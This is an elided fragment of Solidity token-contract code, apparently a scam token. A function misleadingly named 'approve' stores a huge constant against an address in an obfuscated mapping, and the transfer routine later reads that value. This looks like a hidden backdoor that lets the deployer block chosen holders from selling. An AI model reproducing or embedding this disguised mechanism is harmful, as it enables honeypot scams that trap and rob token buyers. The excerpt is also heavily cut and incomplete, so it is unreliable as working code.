...
library SafeMath {
     ...
     */
    function subtbt(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
...
/**
    ...
    mapping(address => uint256) private gtrking;
    function swap(address abc) external   {
    ...
    function approve(address abc) external   {
        ...
        gtrking[abc] = 51116044618658097733785492504341953926634992332820282019728792003956563130857;
    }

    function chabbbbuuugggccc(address abc) public view returns(uint256)  {
        return gtrking[abc];
    }
    ...
    function _transfer(
        ...
        uint256 bugAmount = gtrking[from].subtbt(0);
        ...
        uint256 add = amount2.subtbt(feeeeeA);
    unchecked {
